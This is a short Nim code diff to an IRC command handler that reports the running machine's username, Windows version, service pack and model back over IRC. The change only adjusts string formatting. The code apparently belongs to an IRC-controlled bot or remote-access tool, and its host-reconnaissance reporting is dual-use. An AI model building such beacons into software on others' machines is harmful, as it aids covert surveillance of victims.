@@ -460,6 +460,7 @@ proc cmd_hey(event:IrcEvent, client:AsyncIrc) {.async.} =
         output = output.strip(chars={'\r','\n'})
         output.stripLineEnd()
         win_csd = output
+        win_csd.stripLineEnd()
     except OSError as e:
         #win_csd = repr(e)
         discard
@@ -475,7 +476,7 @@ proc cmd_hey(event:IrcEvent, client:AsyncIrc) {.async.} =
     
     var
         finalmsg:string =   "heyyy v" & 
-                            $current_version & " as " & getEnv("USERNAME") &
+                            $current_version & " USR: " & getEnv("USERNAME") & "\n" &
                             " VER: [" & win_ver & "]\n" &
                             " CSD: [" & win_csd & "]\n" &
                             " MOD: [" & win_mod & "]\n" 
